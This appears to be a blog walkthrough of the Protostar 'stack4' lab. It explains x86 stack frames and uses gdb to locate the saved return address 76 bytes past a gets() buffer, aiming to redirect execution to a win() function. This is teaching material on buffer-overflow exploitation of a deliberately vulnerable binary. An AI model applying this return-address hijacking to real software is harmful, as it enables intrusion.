&lt;p>&lt;img src="https://shantanugoel.com/img/2017/12/stack-frame.png" alt="Stack Frame of function foo">&lt;/p>
&lt;h4 id="important-registers">Important registers&lt;/h4>
&lt;p>The x86 registers that one would be most interested in while understanding stack frames are:&lt;/p>
&lt;ul>
&lt;li>esp: Stack Pointer. Points to (Holds address of) the current top of the stack&lt;/li>
&lt;li>ebp: Base Pointer. Points to (Holds address of) the base of the current stack frame&lt;/li>
&lt;li>eip: Instruction Pointer. Points to (Holds address of) the next instruction to be executed in the program&lt;/li>
&lt;/ul>
&lt;h4 id="calling-convention--function-parameters">Calling Convention / Function Parameters&lt;/h4>
&lt;p>In the x86 calling convention, the parameters being passed to a function and the return address are pushed onto the stack before calling it. This can be seen in the below instruction.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">DWORD&lt;/span> &lt;span style="color:#66d9ef">PTR&lt;/span> [&lt;span style="color:#66d9ef">esp&lt;/span>],&lt;span style="color:#66d9ef">eax&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">call&lt;/span> &lt;span style="color:#ae81ff">0x80483ed&lt;/span> &amp;lt;&lt;span style="color:#66d9ef">foo&lt;/span>&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here, the &lt;code>mov&lt;/code> instruction is pushing the parameter &amp;lsquo;5&amp;rsquo; onto the stack.&lt;/p>
&lt;p>The &lt;code>call&lt;/code> instruction is equivalent of pushing &lt;code>eip + 2&lt;/code> onto the stack and then jumping to the called function&amp;rsquo;s address. &lt;code>eip + 2&lt;/code> here points to the address of the instruction that should be executed next after returning from the called function.&lt;/p>
&lt;h4 id="function-prologue--entry-sequence">Function Prologue / Entry Sequence&lt;/h4>
&lt;p>At the very beginning of a function, the first work done is to save the calling function&amp;rsquo;s base pointer (ebp) onto the stack and then move the current function&amp;rsquo;s base pointer to point towards calling function&amp;rsquo;s top. This can be seen in these instructions:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span>foo:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">push&lt;/span> &lt;span style="color:#66d9ef">ebp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">ebp&lt;/span>,&lt;span style="color:#66d9ef">esp&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="local-variables">Local Variables&lt;/h4>
&lt;p>Then, space is created on the stack for holding any local variables.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">sub&lt;/span> &lt;span style="color:#66d9ef">esp&lt;/span>,&lt;span style="color:#ae81ff">0x10&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="exit-sequence">Exit Sequence&lt;/h4>
&lt;p>Finally, after the function has executed, it returns by restoring the calling function&amp;rsquo;s base pointer and then popping the next value (return address) from stack into the eip.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">leave&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">ret&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here, &lt;code>leave&lt;/code> is equivalent of &lt;code>pop ebp&lt;/code> to restore ebp value. &lt;code>ret&lt;/code> is equivalent of &lt;code>pop eip&lt;/code> to start executing the next instruction after the function call.&lt;/p>
&lt;h4 id="what-we-need-to-do">What we need to do&lt;/h4>
&lt;p>From the above analysis of the stack frame, we now know that:&lt;/p>
&lt;ul>
&lt;li>Program flow is controlled through eip register&lt;/li>
&lt;li>On returning from a called function, eip register is updated with a value (return address) from the stack&lt;/li>
&lt;li>If we can somehow overflow a local variable on stack to modify the return address accurately, we can control the program execution.&lt;/li>
&lt;li>Note that similar to the function &lt;code>foo&lt;/code>, even the function &lt;code>main&lt;/code> has its own stack frame and returns back to &amp;ldquo;something&amp;rdquo; after completing its execution. This &amp;ldquo;something&amp;rdquo; is the c library runtime against which the compiler linked the program. So we can even try to change execution path by modifying this return address.&lt;/li>
&lt;/ul>
&lt;h4 id="gotchas">Gotchas&lt;/h4>
&lt;p>In some explanations, you may see espmain/StackFramemain in the figure above should also include the parameter being passed to foo. However, I&amp;rsquo;ve excluded it here for the sake of avoiding confusion of overlapping stack frames.&lt;/p>
&lt;h2 id="dynamic-analysis">Dynamic Analysis&lt;/h2>
&lt;p>Armed with our static analysis so far, we start our dynamic analysis. So, fire up gdb. We know that &lt;code>main&lt;/code> code is like below:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">0&lt;/span>&lt;span style="color:#a6e22e">x08048408&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;lt;&lt;/span>&lt;span style="color:#66d9ef">main&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">+&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;gt;&lt;/span>: &lt;span style="color:#66d9ef">push&lt;/span> &lt;span style="color:#66d9ef">ebp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">0&lt;/span>&lt;span style="color:#a6e22e">x08048409&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;lt;&lt;/span>&lt;span style="color:#66d9ef">main&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;gt;&lt;/span>: &lt;span style="color:#66d9ef">mov&lt;/span> &lt;span style="color:#66d9ef">ebp&lt;/span>,&lt;span style="color:#66d9ef">esp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">0&lt;/span>&lt;span style="color:#a6e22e">x0804840b&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;lt;&lt;/span>&lt;span style="color:#66d9ef">main&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">+&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;gt;&lt;/span>: &lt;span style="color:#66d9ef">and&lt;/span> &lt;span style="color:#66d9ef">esp&lt;/span>,&lt;span style="color:#ae81ff">0xfffffff0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">0&lt;/span>&lt;span style="color:#a6e22e">x0804840e&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;lt;&lt;/span>&lt;span style="color:#66d9ef">main&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">+&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;gt;&lt;/span>: &lt;span style="color:#66d9ef">sub&lt;/span> &lt;span style="color:#66d9ef">esp&lt;/span>,&lt;span style="color:#ae81ff">0x50&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">0&lt;/span>&lt;span style="color:#a6e22e">x08048411&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;lt;&lt;/span>&lt;span style="color:#66d9ef">main&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">+&lt;/span>&lt;span style="color:#ae81ff">9&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;gt;&lt;/span>: &lt;span style="color:#66d9ef">lea&lt;/span> &lt;span style="color:#66d9ef">eax&lt;/span>,[&lt;span style="color:#66d9ef">esp&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">+&lt;/span>&lt;span style="color:#ae81ff">0x10&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">0&lt;/span>&lt;span style="color:#a6e22e">x08048415&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;lt;&lt;/span>&lt;span style="color:#66d9ef">main&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">+&lt;/span>&lt;span style="color:#ae81ff">13&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;gt;&lt;/span>: &lt;span style="color:#66d9ef">mov&lt;/span> &lt;span style="color:#66d9ef">DWORD&lt;/span> &lt;span style="color:#66d9ef">PTR&lt;/span> [&lt;span style="color:#66d9ef">esp&lt;/span>],&lt;span style="color:#66d9ef">eax&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">0&lt;/span>&lt;span style="color:#a6e22e">x08048418&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;lt;&lt;/span>&lt;span style="color:#66d9ef">main&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">+&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;gt;&lt;/span>: &lt;span style="color:#66d9ef">call&lt;/span> &lt;span style="color:#ae81ff">0x804830c&lt;/span> &amp;lt;&lt;span style="color:#66d9ef">gets@plt&lt;/span>&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">0&lt;/span>&lt;span style="color:#a6e22e">x0804841d&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;lt;&lt;/span>&lt;span style="color:#66d9ef">main&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">+&lt;/span>&lt;span style="color:#ae81ff">21&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;gt;&lt;/span>: &lt;span style="color:#66d9ef">leave&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">0x0804841e&lt;/span> &amp;lt;&lt;span style="color:#66d9ef">main&lt;/span>+&lt;span style="color:#ae81ff">22&lt;/span>&amp;gt;: &lt;span style="color:#66d9ef">ret&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">End&lt;/span> &lt;span style="color:#66d9ef">of&lt;/span> &lt;span style="color:#66d9ef">assembler&lt;/span> &lt;span style="color:#66d9ef">dump.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We set breakpoints at few locations like below:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> b *0x08048408
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Breakpoint &lt;span style="color:#ae81ff">1&lt;/span> at 0x8048408: file stack4/stack4.c, line 12.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> b *0x08048411
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Breakpoint &lt;span style="color:#ae81ff">2&lt;/span> at 0x8048411: file stack4/stack4.c, line 15.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> b *0x08048418
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Breakpoint &lt;span style="color:#ae81ff">3&lt;/span> at 0x8048418: file stack4/stack4.c, line 15.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> b *0x0804841d
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Breakpoint &lt;span style="color:#ae81ff">4&lt;/span> at 0x804841d: file stack4/stack4.c, line 16.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> b *0x0804841e
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Breakpoint &lt;span style="color:#ae81ff">5&lt;/span> at 0x804841e: file stack4/stack4.c, line 16.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now, we run the program till the first couple of breakpoints and analyze the registers/stack.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> r
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Starting program: /opt/protostar/bin/stack4
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Breakpoint 1, main &lt;span style="color:#f92672">(&lt;/span>argc&lt;span style="color:#f92672">=&lt;/span>1, argv&lt;span style="color:#f92672">=&lt;/span>0xbffff864&lt;span style="color:#f92672">)&lt;/span> at stack4/stack4.c:12
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>12 stack4/stack4.c: No such file or directory.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> in stack4/stack4.c
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> info r
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>eax 0xbffff864 -1073743772
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ecx 0xb0a7a13f -1331191489
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>edx 0x1 &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ebx 0xb7fd7ff4 -1208123404
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>esp 0xbffff7bc 0xbffff7bc
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ebp 0xbffff838 0xbffff838
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>esi 0x0 &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>edi 0x0 &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>eip 0x8048408 0x8048408 &amp;lt;main&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>eflags 0x200246 &lt;span style="color:#f92672">[&lt;/span> PF ZF IF ID &lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cs 0x73 &lt;span style="color:#ae81ff">115&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ss 0x7b &lt;span style="color:#ae81ff">123&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ds 0x7b &lt;span style="color:#ae81ff">123&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>es 0x7b &lt;span style="color:#ae81ff">123&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>fs 0x0 &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gs 0x33 &lt;span style="color:#ae81ff">51&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> c
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Continuing.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Breakpoint 2, main &lt;span style="color:#f92672">(&lt;/span>argc&lt;span style="color:#f92672">=&lt;/span>1, argv&lt;span style="color:#f92672">=&lt;/span>0xbffff864&lt;span style="color:#f92672">)&lt;/span> at stack4/stack4.c:15
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>15 in stack4/stack4.c
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> info r
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>eax 0xbffff864 -1073743772
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ecx 0xb0a7a13f -1331191489
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>edx 0x1 &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ebx 0xb7fd7ff4 -1208123404
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>esp 0xbffff760 0xbffff760
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ebp 0xbffff7b8 0xbffff7b8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>esi 0x0 &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>edi 0x0 &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>eip 0x8048411 0x8048411 &amp;lt;main+9&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>eflags 0x200286 &lt;span style="color:#f92672">[&lt;/span> PF SF IF ID &lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cs 0x73 &lt;span style="color:#ae81ff">115&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ss 0x7b &lt;span style="color:#ae81ff">123&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ds 0x7b &lt;span style="color:#ae81ff">123&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>es 0x7b &lt;span style="color:#ae81ff">123&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>fs 0x0 &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gs 0x33 &lt;span style="color:#ae81ff">51&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> x/24x $esp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff760: 0xb7fd7ff4 0xb7ec6165 0xbffff778 0xb7eada75
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff770: 0xb7fd7ff4 0x080495ec 0xbffff788 0x080482e8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff780: 0xb7ff1040 0x080495ec 0xbffff7b8 0x08048449
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff790: 0xb7fd8304 0xb7fd7ff4 0x08048430 0xbffff7b8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff7a0: 0xb7ec6365 0xb7ff1040 0x0804843b 0xb7fd7ff4
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff7b0: 0x08048430 0x00000000 0xbffff838 0xb7eadc76
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> x/4x $ebp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff7b8: 0xbffff838 0xb7eadc76 0x00000001 0xbffff864
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can see that c runtime (or whatever it is that called the main function even if don&amp;rsquo;t want to get ourselves into what that is) has the base pointer (ebp) as 0xbffff838 and this is preserved at 0xbffff7b8. Then, main updates the current stack pointer (esp) as the new ebp of main. After that, main aligns its esp to 16 byte width, thus wasting 8 bytes and then reserves a further 0x50 (80) bytes for its stack. After all these operations, the salient characteristics of main&amp;rsquo;s stack frame are as below:&lt;/p>
&lt;ul>
&lt;li>Current stack top (esp) is 0xbffff760&lt;/li>
&lt;li>Current base pointer (ebp) is 0xbffff7b8&lt;/li>
&lt;li>Main&amp;rsquo;s calling function&amp;rsquo;s ebp is 0xbffff838 and preserved at 0xbffff7b8&lt;/li>
&lt;li>Main&amp;rsquo;s calling function&amp;rsquo;s return address is saved one word before the ebp (as we know as part of the call instruction of calling program). Thus return address is 0xb7eadc76 as we can see at location 0xbffff7bc (previous_ebp + 0x4 = 0xbffff7b8 + 0x4). This address &lt;code>0xbffff7bc&lt;/code> is the one that we want to overwrite with our intended address of &lt;code>win&lt;/code> function so as to execute that instead of main&amp;rsquo;s caller function.&lt;/li>
&lt;/ul>
&lt;p>Now, run till the next breakpoint.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> c
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Continuing.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Breakpoint 3, 0x08048418 in main &lt;span style="color:#f92672">(&lt;/span>argc&lt;span style="color:#f92672">=&lt;/span>1, argv&lt;span style="color:#f92672">=&lt;/span>0xbffff864&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> at stack4/stack4.c:15
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>15 in stack4/stack4.c
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> x $esp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff760: 0xbffff770
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>So we see that the pointer address for storing the input string from &lt;code>gets&lt;/code> is located at 0xbffff770 (since the argument to &lt;code>gets&lt;/code> is the buffer address and it is passed at the top of the stack as we know from previous section). We can see how far away this is from the address we want to overwrite by subtracting it:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>0xbffff7bc - 0xbffff770 &lt;span style="color:#f92672">=&lt;/span> 0x4C &lt;span style="color:#f92672">(&lt;/span>or &lt;span style="color:#ae81ff">76&lt;/span> bytes&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>So, we know that the difference between our intended location and input buffer address is 76 bytes, so if we input 80 bytes, the 77th-80th bytes will overwrite the return address. We can now go for the win (pun intended) already but let&amp;rsquo;s continue further to our rest of the breakpoints to confirm our theory.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> c
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Continuing.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">12345678901234567890123456789012345678901234567890123456789012345678901234567890&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Breakpoint 4, main &lt;span style="color:#f92672">(&lt;/span>argc&lt;span style="color:#f92672">=&lt;/span>0, argv&lt;span style="color:#f92672">=&lt;/span>0xbffff864&lt;span style="color:#f92672">)&lt;/span> at stack4/stack4.c:16
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>16 in stack4/stack4.c
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> x/24x $esp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff760: 0xbffff770 0xb7ec6165 0xbffff778 0xb7eada75
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff770: 0x34333231 0x38373635 0x32313039 0x36353433
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff780: 0x30393837 0x34333231 0x38373635 0x32313039
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff790: 0x36353433 0x30393837 0x34333231 0x38373635
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff7a0: 0x32313039 0x36353433 0x30393837 0x34333231
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0xbffff7b0: 0x38373635 0x32313039 0x36353433 0x30393837
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> info r $ebp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ebp 0xbffff7b8 0xbffff7b8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> c
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Continuing.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Breakpoint 5, 0x0804841e in main &lt;span style="color:#f92672">(&lt;/span>argc&lt;span style="color:#f92672">=&lt;/span>Cannot access memory at address 0x3635343b
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">)&lt;/span> at stack4/stack4.c:16
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>16 in stack4/stack4.c
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> info r $ebp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ebp 0x36353433 0x36353433
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We continue and enter an 80 byte long pattern and can see the repeated pattern visible on the stack and the last 4 bytes &lt;code>7890&lt;/code> (0x30393837 in little endian hex format) have overwritten the address. We also see that if we stop after the &lt;code>leave&lt;/code> instruction, the value 0x36353433 from address 0xbffff7b8 has been popped back into ebp.&lt;/p>
&lt;p>Now, we find out the address of the &lt;code>win&lt;/code> function and use its address as the last 4 bytes in an 80 byte input to the program to crack it.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> x win
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x80483f4 &amp;lt;win&amp;gt;: 0x83e58955
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> quit
